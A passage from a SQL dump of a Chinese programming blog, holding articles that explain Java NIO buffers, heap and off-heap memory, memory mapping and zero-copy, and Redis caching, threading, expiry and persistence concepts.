}\n}\n\n返回了一个HeapByteBufferR,Heap表示是堆,R表示只读\n新buffer的内容就是原buffer的内容,对原buffer内容的改变,对新buffer也是可见的\n新buffer本身是只读的,并且不允许共享内容的修改\n两个buffer的position,limit,mark都是独立的\n```\n#### MappedByteBuffer\n```java\npublic static void main(String[] args) throws Exception {\n        RandomAccessFile randomAccessFile = new RandomAccessFile(\"NioTest.txt\", \"rw\");\n        FileChannel fileChannel = randomAccessFile.getChannel();\n        // 映射5个字节大小 将内存文件映射到内存当中\n        MappedByteBuffer mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_WRITE, 0, 5);\n        mappedByteBuffer.put(0, (byte)\'a\');\n        mappedByteBuffer.put(3, (byte)\'b\');\n        randomAccessFile.close();\n}\n\nappedByteBuffer内存映射文件是一种允许Java程序直接从内存访问的一种特殊文件,我们可以将整个文件或者说整个文件的一部分映射到内存当中\n那么接下来由操作系统来负责相关的页面请求,并且将内存修改写入到文件当中,我们的应用程序只需要处理内存的数据,这样可以实现非常迅速的io操作,因为内存映射文件的内存本身是在Java的堆外内存\n```\n#### FileLock\n```java\npublic static void main(String[] args) throws Exception {\n        RandomAccessFile randomAccessFile = new RandomAccessFile(\"NioTest.txt\", \"rw\");\n        FileChannel fileChannel = randomAccessFile.getChannel();\n\n        FileLock fileLock = fileChannel.lock(3, 6, true);// 获取此通道文件的给定区域的锁定,锁定区域开始结束,是否共享\n        System.out.println(\"valid: \" + fileLock.isValid()); // 锁是否有效\n        System.out.println(\"lock type: \" + fileLock.isShared()); // 锁是否共享\n\n        fileLock.release();// 释放锁\n        randomAccessFile.close();\n}\n\n获取此channel文件的给定区域的锁定\n以先到者为准,此方法的调用将阻塞，直到该channel可以已锁定，此channel已关闭，或调用的线程被中断。\n如果在调用期间该通道被另一个线程关闭此方法将抛出AsynchronousCloseException \n共享锁【S锁】: 又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。\n排他锁【X锁】: 又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。\n```\n#### Scattering与Gathering\n```java\npublic static void main(String[] args) throws Exception {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(8899);\n        serverSocketChannel.socket().bind(address);\n\n        int messageLength = 2 + 3 + 4;\n\n        ByteBuffer[] buffers = new ByteBuffer[3];\n        buffers[0] = ByteBuffer.allocate(2);\n        buffers[1] = ByteBuffer.allocate(3);\n        buffers[2] = ByteBuffer.allocate(4);\n\n        SocketChannel socketChannel = serverSocketChannel.accept();\n        while(true) {\n            int bytesRead = 0;\n            while(bytesRead < messageLength) {\n                long r = socketChannel.read(buffers);\n                bytesRead += r;\n                System.out.println(\"byteRead:\" + bytesRead);\n                Arrays.asList(buffers).stream().map(buffer -> \"position: \" + buffer.position() + \", limit: \" + buffer.limit())\n                .forEach(System.out::println);\n            }\n\n            Arrays.asList(buffers).forEach(buffer -> {\n                buffer.flip();\n            });\n\n            long bytesWritten = 0;\n            while(bytesWritten < messageLength) {\n                long r = socketChannel.write(buffers);\n                bytesWritten += r;\n            }\n            Arrays.asList(buffers).forEach( buffer -> {\n                buffer.clear();\n            });\n            System.out.println(\"byteRead: \" + bytesRead + \", byteWritten:\" + bytesWritten + \", messageLength:\" + messageLength);\n        }\n}\n\n// Scattering\nbuffer无论读写,都是把信息放置到我们所传递进去的byteBuffer当中,buffer只有一个\nScattering分散: 我们在读的时间不仅可以传递一个buffer,我们还可以传递一个buffer的数组\n举个例子,比如说我要从channel当中把信息读到buffer里面,那么channel里面有20个字节,我可以传递一个buffer数组,往数组里面去读信息(第一个buffer的capacity长度是10,第二个是5,第三个是5),它会将第一个buffer读满,依次读满三个buffer\n把来自于一个channel当中的数据读到了多个buffer当中,它总是按照顺序,并且只有把第一个读满之后再去第二个,第二个读满读第三个\n如果第一个没有读满是不会去读第二个的,这是scattering的含义\n\n// Gathering\nGathering合并: 与scattering反过来,我们在往外写的时候,也可以传递一个buffer的数组\n它会将第一个buffer全部都写到外面,写到channel当中,然后写第二个,写三个,按照顺序来进行,这是gathering的含义\n\n// 应用场景\n关于sattering和gathering它们的用途场景\n举个例子,我们自定义一个协议,将请求头,消息体分别读取到不同的buffer当中,天然的实现了数据的分门别类,不必是我只传递一个buffe,把请求头和消息体的信息都读到buffer,然后再去解析这个buffer,不必这样去做了\n```', 0, 0, 182, 0, 0, '2019-06-27 08:59:38', '2020-02-04 08:59:38', 0, 0);
INSERT INTO `article` VALUES (25, 1, 'Java的堆内内存与堆外内存', '2019/9/1567589869_mmexport1567218143005.jpg', '### 堆外内存\n![网络IO堆外内存.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624955727_网络IO-堆外内存.png)\n```java\n// 堆内和堆外的概念：\n(1) 堆内内存heap:\n	指的是JVM中的堆内存\n(2) 堆外内存off-heap:\n	指的是独立于JVM之外的一块内存,不属于JVM,而是直属于操作系统\n\n// 堆外内存有什么优势\n堆内的数据如果要网络IO写出去,必须要先拷贝到堆外内存,再然后才能写入到socket里发送出去\n这样的话,可以直接将数据分配在堆外内存,这样就不需要进行一次拷贝,这样会让性能提高\n读写文件IO时也是同理,可以大幅度提升性能\n\n// 使用堆内内存,返回对象HeapByteBuffer\nByteBuffer buffer = ByteBuffer.allocate(512);\n// 使用堆外内存,返回对象DirectByteBuffer\nByteBuffer buffer = ByteBuffer.allocateDirect(1024); // 传入的是你要申请的堆外内存的大小\n// 你可以直接把你的数据写入到内外内存DirectByteBuffer里去\n// 把这块数据通过Socket发送，就是直接发送就可以了，不需要走一个拷贝\n\n// HeapByteBuffer 堆内内存\n1、allocate方法底层直接new出一个HeapByteBuffer对象,构造出相应数据,调用父构造就完成了,是纯粹的Java对象并且构造方法的实现包括成员变量等等都是在Java领域的,并没有用到native方法	\n2、纯粹的Java对象,里面维护着一个字节数组,这个字节数组是真正用来存放着数据的源头,整个这些内容都是在Java这个领域当中,这个字节数组对象毫无疑问是在堆上面的\n3、对于这个所生成的HeapByteBuffer它也位于堆上面的,因为new出来的对象一定是位于堆上面的,底层维护的字节数组也是在Java内存结构所管控的范围之内,换句话说,Java虚拟机是可以直接操控这块内存的,它们是属于Java领域内的\n\n// DirectByteBuffer 堆外内存\n1、allocateDirect方法new出一个DirectByteBuffer对象,称之为直接字节缓冲,底层调用了oraclejdk的闭源包,调用闭源unsafe类分配内存相关内容,应用到了大量的native方法\n2、Buffer的address属性的官方注释上标明与directBuffer有关联\n// DirectByteBuffer由两部分来构成的\n1. 一部分称为Java,在jvm直接就能操控的内容,Java部分看到的内容就是DirectByteBuffer这个对象,所以它是位于Java堆上面的\n2. 一部分称为Native,不在Java范围之中,它不在堆上面,通常称之为堆外内存,native方法就会通过C/C++方式去生成内存\n3. 如果对C/C++有些了解的话,C中有malloc方法,通过这种原生方式来生成相应数据.这种属于在系统本地的内存空间,并不在Java的内存空间当中,所以它称之为堆外内存\n// address作用\n1. Java与Native它们两者之间必然存在关联关系,否则native生成后,Java没法操控数据了,所以必须通过一种引用的方式\n2. 引用的方式directByteBuffer中一定有某个成员变量,这个成员变量是可以访问到堆外内存的数据的\n3. 在抽象类buffer当中,发现成员变量long address,注释说明说这是只被directByteBuffer使用,address会引用到堆外内存的真正数据\naddress表示的是在堆外内存当中,所真正分配的内存数据的地址 \n4. 之前所使用到的heapByteBuffer,它所有的内存都是在Java堆上进行的,在jvm内存结构中是可以访问到的,也是在jvm的管控当中\n5. 然而,与之对应的directByteBuffer直接缓冲,直接缓冲对象本身它依然是位于堆上面的,因为它本身是个Java对象,然而它里面的有个address long类型的成员变量\n6. 这个long类型的成员变量表示的就是在堆外由操作系统,通过C/C+向操作系统申请的一块堆外内存,address表示的是堆外内存的地址,所以通过它的地址就能直接的去找到在堆外所生成的所分配的数据\n\n// 对于HeapByteBuffer\n1. 如果使用heapByteBuffer,它在进行数据的读取或写入的时候,如果我们用的是间接的bytebuffer(heapbytebuff),那么这个内存包括它里面所封装的字节数组都是在Java堆上的\n2. 然而对于操作系统来说,操作系统它并不是直接的就处理heapbyteBuffer在堆上所封装的字节数组\n3. 操作系统实际上会在操作系统开辟一块内存区域,读取或写入时它实际是将Java堆上面的heapbuffer里面的字节数组内容给拷贝到它所开辟的内存某区域当中,然后再把这里面的数据拿出来进行跟IO设备进行数据的读取或写入\n4. 换句话说,如果我们所使用的时heapbytebuffer的话,它实际上多了一次数据拷贝的过程,会把Java内存空间当中的字节数组内容原封不动的拷贝到操作系统开辟的内存区域当中,这个内存区域会直接和IO设备进行交互\n\n// 对于DirectByteBuffer\n1. 如果使用directByteBuffer,在Java堆上面就不会在存在一个所谓的字节数组了,因为真正的数据就已经在堆外内存放着,所以如果进行数据的读写的话,直接就由操作系统来去跟堆外内存进行交互,少了数据拷贝的过程,这种方式称之为零拷贝\n\n// 为什么操作系统不直接操控堆上面的数据\n1. 并不是操作系统没法访问这块内存,内存地址一定是确定才能访问到内存区域,然而正在访问内存区域的时候,突然在这个内存区域发生了垃圾回收GC,除了CMS(并发标记清除)算法之外,其他垃圾回收都涉及到先标记再压缩这个过程\n2. 如果native正在操作数组的时候,GC正在进行内存数据移动的话,整个数据就乱套了,所以不能进行GC这种操作,那么显然,GC操作不能的话,那很可能会出现错误\n3. 除非让内存单个对象不去移动或者不让发生垃圾回收这种动作,但是不让发生垃圾回收动作就显然不可行的,所以这种方案就堵死了.\n通过原生代码去操作Java堆上内存的这种方式就堵死了\n\n// 为什么Java采用了非直接缓冲的拷贝方式\n1. 把字节数组内存给拷贝到堆外上去,拷贝到堆外上去,实际基于这些条件,拷贝动作是比较快的,同时设备io操作速度又没有那么快,这种操作性价比就是比较高的事情,所以会执行这种拷贝的方式\n2. 拷贝的过程中是不会产生GC的,如果拷贝过程也产生GC的话,那么也是没有意义的,这一点上jvm做出了保证\n3. 把数据拷贝到操作系统所开辟的内存之后,那么事情就比较简单了,这个内存就由操作系统来把控了,至于内存释放,由于是操作系统开辟维护的,它相应的就会释放掉,所以不会出现内存泄漏的情况\n\n// 关于直接缓冲的零拷贝\n1. 对于零拷贝,这个内存区域实际上,address会维护它的引用相当于它的地址,当Java堆上DirectByteBuffer被回收掉的时候,那么它就能找到相应的堆外的内存,接下来通过jni的方式就可以把堆外内存给回收掉,所以依然不会出现内存泄漏的情况\n2. directByteBuffer是存储在Java堆上面的标准Java对象,但是它持有着一个操作系统内存的引用,这个称之为直接内存模型\n3. 在这种直接内存模型之前,Java堆上的数据如果想要和外界进行交换的话,非jvm内存结构领域想要交换数据的话,必须要经过一个native堆,就是操作系统本地的堆,实现一次数据从Java堆拷贝到native堆的这么一个过程,然后再把它由native进行相应io操作,实际就多了一次没有意义的数据拷贝\n4. 如果直接使用堆外内存(直接内存)的话,那么通过这种直接内存就可以直接跟外设io进行打交道,这部分内存实际上在Java的堆外,通过这种方式实现零拷贝概念和操作\n5. 所以对于Java里的bytebuffer来说呢,我们不考虑读写这个维度,只考虑直接间接,那么它实际上它有两种实现类,一种称之为直接缓冲区,另一种称之为非直接缓冲区或间接缓冲区,那么对于直接缓冲区来说,Java虚拟机就是可以直接进行本地的io操作,避免了在操作系统的原生io操作时还要复制内容到一个中间缓存区,这也被称为中间缓冲区\n\n// 堆外内存溢出\n -XX:MaxDirectMemorySize：这个JVM参数是可以设置你最大可以使用的堆外内存的大小的\n比如说设置堆外内存最大可以使用1GB，此时已经使用了950MB空间了\n你此时要申请一块80MB的堆外内存,会发现说，堆外内存已经不够了，此时不能直接分配堆外内存了\n操作系统会进行如下检查\n	(1) 如果堆外内存分配空间大小足够，就直接预留一部分内存\n	(2) 如果堆外内存分配空间大小不足，则将已经被 JVM 垃圾回收的DirectBuffer对象的堆外内存释放\n	(3) 如果进行一次堆外内存资源回收后，还不够进行本次堆外内存分配的话，则进行 System.gc()\n	(4) 如果如上9次尝试后依旧没有足够的可用堆外内存，则抛异常\n\n```', 0, 0, 103, 0, 0, '2019-06-28 17:38:12', '2020-10-15 17:38:12', 0, 0);
INSERT INTO `article` VALUES (26, 1, 'Java的内存映射与零拷贝', '2019/9/1567662235_mmexport1567598161709.jpg', '### 基本概述\n```java\n// 关于零拷贝基础的知识\n1. 操作系统空间分为user space(用户空间)和kernel space(内核空间),因此在进行应用程序与操作系统之间需要经过上下文的切换\n2. 零拷贝依赖于操作系统的,对于应用程序来说完全无法干涉实现零拷贝,大部分操作系统都有着零拷贝的实现支持\n3. 零拷贝所带来的效率提升是巨大的,非常非常值得进行应用\n\n// 零拷贝是什么\n1. 零拷贝技术可以减少数据拷贝和共享总线操作的次数，消除传输数据在存储器之间不必要的中间拷贝次数，从而有效地提高数据传输效率\n2. 零拷贝技术减少了用户应用程序地址空间和操作系统内核地址空间之间因为上下文切换而带来的开销\n3. 进行大量的数据拷贝操作其实是一件简单的任务，从操作系统的角度来说，如果 CPU 一直被占用着去执行这项简单的任务，那么这将会是很浪费资源的；如果有其他比较简单的系统部件可以代劳这件事情，从而使得 CPU 解脱出来可以做别的事情，那么系统资源的利用则会更加有效\n\n```\n\n### 普通IO\n![网络IO普通IO操作在系统层面执行.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624961611_网络IO-普通IO操作在系统层面执行.png)\n```java\n// 普通IO操作在系统层面执行\n(1) 进程发起read读取数据时,会进行用户空间到内核空间的切换\n(2) DMA引擎把磁盘上的数据拷贝到内核read缓冲区里去后\n(3) 然后内核空间切换到用户空间,基于CPU把内核缓冲里的数据拷贝到用户缓冲区里去\n(3) 进程调用Socket的输出流的write方法，此时会从用户空间切换到内核空间,基于CPU把用户缓冲区里的数据拷贝到内核Socket缓冲区里去\n(4) 接着会有一个异步化的过程，基于DMA引擎从内核Socket缓冲区里把数据拷贝到网卡里发送出去\n\n进行了4次拷贝,性能差\n```\n### 内存映射\n![网络IO内存映射.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624961611_网络IO-内存映射.png)\n```java\n// 有一种mmap技术叫做内存映射\n现代所有操作系统都使用虚拟内存,使用虚拟内存地址取代物理地址,这样做有两个好处\n(1) 一个以上的虚拟地址可以指向同一个物理内存地址\n(2) 虚拟内存空间可大于实际可用的物理地址\n\n// 内存映射操作在系统层面执行\n(1) 从用户空间切换到内核空间,DMA引擎把磁盘上的数据拷贝到内核缓冲里去\n(2) 接着从内核空间切换到用户空间，建立用户缓冲区和内核缓冲区的映射,让它们指向同一块物理内存地址,因为用户缓冲区是跟内核缓冲区共享一块映射数据的，建立共享映射之后，就不需要从内核缓冲区拷贝到用户缓冲区了,光是这一点，相比于普通IO就可以避免一次拷贝了\n(3) 用户空间切换到内核空间,把内核read缓冲区的数据拷贝到内核Socket缓冲区里\n(4) 然后再拷贝到网卡里，发送出去就可以了\n\n相比于普通IO,减少一次拷贝，但是并不减少切换次数\n进行了3次拷贝\n\nRocketMQ底层主要就是基于mmap技术来提升了磁盘文件的读写，性能\n\n// Java如何使用内存映射\nNIO中的FileChannel.map()方法其实就是采用了操作系统中的内存映射方式，底层就是调用Linux mmap()实现的。\n将内核缓冲区的内存和用户缓冲区的内存做了一个地址映射。\n\n```\n### 零拷贝\n![网络IO零拷贝.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624961611_网络IO-零拷贝.png)\n```java\n// 零拷贝操作在系统层面执行\nlinux提供了sendfile，也就是零拷贝技术\n(1) 从用户空间切换到内核空间,DMA引擎把磁盘上的数据拷贝到内核read缓冲区里去\n(3) 从内核read缓冲区拷贝一些offset和length到内核Socket缓冲区,这个offset和length的量很少，几乎可以忽略\n(4) 内核Socket缓冲区根据offset将内核read缓冲区的数据数据拷贝到网卡里发送出去\n\n进行了2次拷贝\n\nkafka、tomcat，都是用的零拷贝技术\n\n// Java如何使用零拷贝\n// FileChannel\nFileChannel.transferTo()方法直接将当前通道内容传输到另一个通道，没有涉及到Buffer的任何操作\ntransferTo()的实现方式就是通过系统调用sendfile() (这是Linux中的系统调用)\nJava NIO提供的FileChannel.transferTo 和 transferFrom 并不保证一定能使用零拷贝。\n实际上是否能使用零拷贝与操作系统相关，要看操作系统能否提供 sendfile 这样的零拷贝系统调用\n\n```', 0, 0, 129, 0, 0, '2019-06-28 13:44:04', '2020-08-23 13:44:04', 0, 0);
INSERT INTO `article` VALUES (27, 1, 'redis基本概念', '2019/6/1560581371_279CB52F417AA985F703BE162F3F10B5.jpg', '### 基本概念\n#### 高性能\n![Redis高性能.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623217861_Redis-高性能.png)\n#### 高并发\n![Redis高并发.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623218835_Redis-高并发.png)\n```java\n// 为啥在项目里要用缓存\n用缓存，主要是俩用途，高性能和高并发\n（1）高性能\n假设场景，有个操作，一个请求过来,各种乱七八糟操作mysql，半天查出来一个结果，耗时600ms。但是这个结果可能接下来几个小时都不会变了，或者变了也可以不用立即反馈给用户。\n那么此时咋办？缓存啊，折腾600ms查出来的结果，扔缓存里，一个key对应一个value，下次再有人查，别走mysql折腾600ms了。直接从缓存里，通过一个key查出来一个value，2ms搞定。性能提升300倍。这就是所谓的高性能。\n就是把你一些复杂操作耗时查出来的结果，如果确定后面不咋变了，然后但是马上还有很多读请求，那么直接结果放缓存，后面直接读缓存就好了。\n(2）高并发\nmysql这么重的数据库，设计不是让你玩高并发的，虽然也可以玩儿，但是天然支持不好。\nmysql单机支撑到2000qps也开始容易报警了。所以要是你有个系统，高峰期一秒钟过来的请求有1万，一个mysql单机绝对会死掉。你这个时候就只能上缓存，把很多数据放缓存，别放mysql。\n缓存功能简单，说白了就是key-value式操作，单机支撑的并发量轻松一秒几万十几万，支撑高并发so easy。单机承载并发量是mysql单机的几十倍。\n缓存结果的复杂查询场景，后续可以大幅度提升性能，优化用户体验。\n\n// 用了缓存之后会有啥不良的后果？\n(1)缓存与数据库双写不一致\n(2)缓存雪崩\n(3)缓存穿透\n(4)缓存并发竞争\n\n```\n### 单线程模型\n![Redis单线程模型.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623222272_Redis-单线程模型.png)\n```java\n// redis的线程模型\n// 文件事件处理器\n1. redis基于reactor模式开发了网络事件处理器，这个处理器叫做文件事件处理器，file event handler。\n2. 这个文件事件处理器，是单线程的，redis才叫做单线程的模型，采用IO多路复用机制同时监听多个socket，根据socket上的事件来选择对应的事件处理器来处理这个事件。\n3. 如果被监听的socket准备好执行accept、read、write、close等操作的时候，跟操作对应的文件事件就会产生，这个时候文件事件处理器就会调用之前关联好的事件处理器来处理这个事件。\n4. 文件事件处理器是单线程模式运行的，但是通过IO多路复用机制监听多个socket，可以实现高性能的网络通信模型，又可以跟内部其他单线程的模块进行对接，保证了redis内部的线程模型的简单性。\n5. 文件事件处理器的结构包含4个部分：多个socket，IO多路复用程序，文件事件分派器，事件处理器（命令请求处理器、命令回复处理器、连接应答处理器，等等）。\n6. 多个socket可能并发的产生不同的操作，每个操作对应不同的文件事件，但是IO多路复用程序会监听多个socket，但是会将socket放入一个队列中排队，每次从队列中取出一个socket给事件分派器，事件分派器把socket给对应的事件处理器。\n7. 然后一个socket的事件处理完之后，IO多路复用程序才会将队列中的下一个socket给事件分派器。文件事件分派器会根据每个socket当前产生的事件，来选择对应的事件处理器来处理。\n\n// 文件事件\n1. 当socket变得可读时（比如客户端对redis执行write操作，或者close操作），或者有新的可以应答的sccket出现时（客户端对redis执行connect操作），socket就会产生一个AE_READABLE事件。\n2. 当socket变得可写的时候（客户端对redis执行read操作），socket会产生一个AE_WRITABLE事件。\n3. IO多路复用程序可以同时监听AE_REABLE和AE_WRITABLE两种事件，要是一个socket同时产生了AE_READABLE和AE_WRITABLE两种事件，那么文件事件分派器优先处理AE_REABLE事件，然后才是AE_WRITABLE事件。\n4. 文件事件处理器根据事件将socket关联到不同的应答处理器\n	(1) 如果是客户端要连接redis，那么会为socket关联连接应答处理器\n	(2) 如果是客户端要写数据到redis，那么会为socket关联命令请求处理器\n	(3) 如果是客户端要从redis读数据，那么会为socket关联命令回复处理器\n\n// 客户端与redis通信的一次流程\n1. 在redis启动初始化的时候，redis会将连接应答处理器跟AE_READABLE事件关联起来，接着如果一个客户端跟redis发起连接，此时会产生一个AE_READABLE事件，然后由连接应答处理器来处理跟客户端建立连接，创建客户端对应的socket，同时将这个socket的AE_READABLE事件跟命令请求处理器关联起来。\n2. 当客户端向redis发起请求的时候（不管是读请求还是写请求，都一样），首先就会在socket产生一个AE_READABLE事件，然后由对应的命令请求处理器来处理。这个命令请求处理器就会从socket中读取请求相关数据，然后进行执行和处理。\n3. 接着redis这边准备好了给客户端的响应数据之后，就会将socket的AE_WRITABLE事件跟命令回复处理器关联起来，当客户端这边准备好读取响应数据时，就会在socket上产生一个AE_WRITABLE事件，会由对应的命令回复处理器来处理，就是将准备好的响应数据写入socket，供客户端来读取。\n4. 命令回复处理器写完之后，就会删除这个socket的AE_WRITABLE事件和命令回复处理器的关联关系。\n\n// 为什么redis单线程模型效率高？\n1. 纯内存操作,硬件级优化\n2. 核心是基于非阻塞的IO多路复用机制,系统级优化\n3. 单线程反而避免了多线程的频繁上下文切换问题,系统级问题\n\n```\n\n### 数据类型\n```java\n（1）string\n这是最基本的类型了，没啥可说的，就是普通的set和get，做简单的kv缓存\n（2）hash\n这个是类似map的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是这个对象没嵌套其他的对象）给缓存在redis里，然后每次读写缓存的时候，可以就操作hash里的某个字段。\nkey=150\nvalue={\n	“id”: 100,\n	“name”: “zhangsan”,\n	“age”: 20\n}\nhash类的数据结构，主要是用来存放一些对象，把一些简单的对象给缓存起来，后续操作的时候，你可以直接仅仅修改这个对象中的某个字段的值\nvalue={\n	“id”: 100,\n	“name”: “zhangsan”,\n	“age”: 21\n}\n（3）list\n有序列表\n某个大v的粉丝，就可以以list的格式放在redis里去缓存\nkey=某大v\nvalue=[zhangsan, lisi, wangwu]\n比如可以通过list存储一些列表型的数据结构，类似粉丝列表了、文章的评论列表了之类的东西\n比如可以通过lrange命令，就是从某个元素开始读取多少个元素，可以基于list实现分页查询，这个很棒的一个功能，基于redis实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西，性能高，就一页一页走\n比如可以搞个简单的消息队列，从list头怼进去，从list尾巴那里弄出来\n（4）set\n无序集合，自动去重\n直接基于set将系统里需要去重的数据扔进去，自动就给去重了，如果你需要对一些数据进行快速的全局去重，你当然也可以基于jvm内存里的HashSet进行去重，但是如果你的某个系统部署在多台机器上呢？\n得基于redis进行全局的set去重\n可以基于set玩儿交集、并集、差集的操作，比如交集吧，可以把两个人的粉丝列表整一个交集，看看俩人的共同好友是谁\n把两个大v的粉丝都放在两个set中，对两个set做交集\n（5）sorted set\n排序的set，去重但是可以排序，写进去的时候给一个分数，自动根据分数排序，这个可以玩儿很多的花样，最大的特点是有个分数可以自定义排序规则\n比如说你要是想根据时间对数据排序，那么可以写入进去的时候用某个时间作为分数，人家自动给你按照时间排序了\n排行榜：将每个用户以及其对应的什么分数写入进去，zadd board score username，接着zrevrange board 0 99，就可以获取排名前100的用户；zrank board username，可以看到用户在排行榜里的排名\n\n```\n### 过期策略\n```java\n我们set key的时候，都可以给一个expire time，就是过期时间，指定这个key比如说只能存活1个小时，10分钟，这个很有用，我们自己可以指定缓存到期就失效。\n如果假设你设置一个一批key只能存活1个小时，那么接下来1小时后，redis是怎么对这批key进行删除的？\n// 定期删除+惰性删除\n// 定期删除\n所谓定期删除，指的是redis默认是每隔100ms就随机抽取一些设置了过期时间的key，检查其是否过期，如果过期就删除。\n假设redis里放了10万个key，都设置了过期时间，你每隔几百毫秒，就检查10万个key，那redis基本上就死了，cpu负载会很高的，消耗在你的检查过期key上了。\n注意，这里可不是每隔100ms就遍历所有的设置过期时间的key，那样就是一场性能上的灾难。实际上redis是每隔100ms随机抽取一些key来检查和删除的。\n// 惰性删除\n但是问题是，定期删除可能会导致很多过期key到了时间并没有被删除掉，那咋整呢？所以就是惰性删除了。\n这就是说，在你获取某个key的时候，redis会检查一下 ，这个key如果设置了过期时间那么是否过期了？如果过期了此时就会删除，不会给你返回任何东西。\n并不是key到时间就被删除掉，而是你查询这个key的时候，redis再懒惰的检查一下\n通过上述两种手段结合起来，保证过期的key一定会被干掉。\n很简单，就是说，你的过期key，靠定期删除没有被删除掉，还停留在内存里，占用着你的内存呢，除非你的系统去查一下那个key，才会被redis给删除掉。\n但是实际上这还是有问题的，如果定期删除漏掉了很多过期key，然后你也没及时去查，也就没走惰性删除，此时会怎么样？如果大量过期key堆积在内存里，导致redis内存块耗尽了，咋整？\n答案是走内存淘汰机制。\n// 内存淘汰\n如果redis的内存占用过多的时候，此时会进行内存淘汰，有如下一些策略：\nredis 10个key，现在已经满了，redis需要删除掉5个key\n(1) noeviction：当内存不足以容纳新写入数据时，新写入操作会报错，这个一般没人用吧，实在是太恶心了\n(2) allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的key（这个是最常用的）\n(3) allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个key，这个一般没人用吧，为啥要随机，肯定是把最近最少使用的key给干掉啊\n(4) volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key（这个一般不太合适）\n(5) volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key\n(6) volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除\n\n```\n### 持久化机制\n```java\n// redis持久化机对于生产环境中的灾难恢复的意义\n比如你部署了一个redis，作为cache缓存，当然也可以保存一些较为重要的数据\n如果没有持久化的话，redis遇到灾难性故障的时候，就会丢失所有的数据\n如果通过持久化将数据搞一份儿在磁盘上去，然后定期比如说同步和备份到一些云存储服务上去，那么就可以保证数据不丢失全部，还是可以恢复一部分数据回来的\n对于一个企业级的redis架构来说，持久化是不可减少的\n企业级redis集群架构：海量数据、高并发、高可用\n持久化主要是做灾难恢复，数据恢复，也可以归类到高可用的一个环节里面去\n比如你redis整个挂了，然后redis就不可用了，你要做的事情是让redis变得可用，尽快变得可用\n重启redis，尽快让它对外提供服务,如果你没做数据备份，这个时候redis启动了，也不可用啊，数据都没了\n很可能说，大量的请求过来，缓存全部无法命中，在redis里根本找不到数据，这个时候就死定了，缓存雪崩问题，所有请求，没有在redis命中，就会去mysql数据库这种数据源头中去找，一下子mysql承接高并发，然后就挂了\n如果你把redis的持久化做好，备份和恢复方案做到企业级的程度，那么即使你的redis故障了，也可以通过备份数据，快速恢复，一旦恢复立即对外提供服务\n\n// redis的RDB和AOF两种持久化机制的工作原理\n// RDB和AOF两种持久化机制的介绍\nRDB机制对redis中的数据执行周期性的持久化\nAOF机制对每条写入命令作为日志，以append-only的模式写入一个日志文件中，在redis重启的时候，可以通过回放AOF日志中的写入指令来重新构建整个数据集\n\n如果我们想要redis仅仅作为纯内存的缓存来用，那么可以禁止RDB和AOF所有的持久化机制\n通过RDB或AOF，都可以将redis内存中的数据给持久化到磁盘上面来，然后可以将这些数据备份到别的地方去，比如说阿里云，云服务\n如果redis挂了，服务器上的内存和磁盘上的数据都丢了，可以从云服务上拷贝回来之前的数据，放到指定的目录中，然后重新启动redis，redis就会自动根据持久化数据文件中的数据，去恢复内存中的数据，继续对外提供服务\n如果同时使用RDB和AOF两种持久化机制，那么在redis重启的时候，会使用AOF来重新构建数据，因为AOF中的数据更加完整\n\n// RDB持久化机制的优点\n1. RDB会生成多个数据文件，每个数据文件都代表了某一个时刻中redis的数据，这种多个数据文件的方式，非常适合做冷备，可以将这种完整的数据文件发送到一些远程的安全存储上去，以预定好的备份策略来定期备份redis中的数据\nRDB可以做冷备，生成多个文件，每个文件都代表了某一个时刻的完整的数据快照\nRDB做冷备，优势在哪儿呢？由redis去控制固定时长生成快照文件的事情，比较方便; AOF，还需要自己写一些脚本去做这个事情，各种定时\nRDB数据做冷备，在最坏的情况下，提供数据恢复的时候，速度比AOF快\nAOF也可以做冷备，只有一个文件，但是你可以，每隔一定时间，去copy一份这个文件出来\n\n2. RDB对redis对外提供的读写服务，影响非常小，可以让redis保持高性能，因为redis主进程只需要fork一个子进程，让子进程执行磁盘IO操作来进行RDB持久化即可\nRDB，每次写，都是直接写redis内存，只是在一定的时候，才会将数据写入磁盘中\nAOF，每次都是要写文件的，虽然可以快速写入os cache中，但是还是有一定的时间开销的,速度肯定比RDB略慢一些\n\n3. 相对于AOF持久化机制来说，直接基于RDB数据文件来重启和恢复redis进程，更加快速\nAOF，存放的指令日志，做数据恢复的时候，其实是要回放和执行所有的指令日志，来恢复出来内存中的所有数据的\nRDB，就是一份数据文件，恢复的时候，直接加载到内存中即可\n\n结合上述优点，RDB特别适合做冷备份\n\n// RDB持久化机制的缺点	\n1. 如果想要在redis故障时，尽可能少的丢失数据，那么RDB没有AOF好。\n一般来说，RDB数据快照文件，都是每隔5分钟，或者更长时间生成一次，这个时候就得接受一旦redis进程宕机，那么会丢失最近5分钟的数据\n2. RDB每次在fork子进程来执行RDB快照数据文件生成的时候，如果数据文件特别大，可能会导致对客户端提供的服务暂停数毫秒，或者甚至数秒\n一般不要让RDB的间隔太长，否则每次生成的RDB文件太大了，对redis本身的性能可能会有影响的\n\n// AOF持久化机制的优点\n1. AOF可以更好的保护数据不丢失，一般AOF会每隔1秒，通过一个后台线程执行一次fsync操作，最多丢失1秒钟的数据,每隔1秒，就执行一次fsync操作，保证os cache中的数据写入磁盘中\nredis进程挂了，最多丢掉1秒钟的数据\n2. 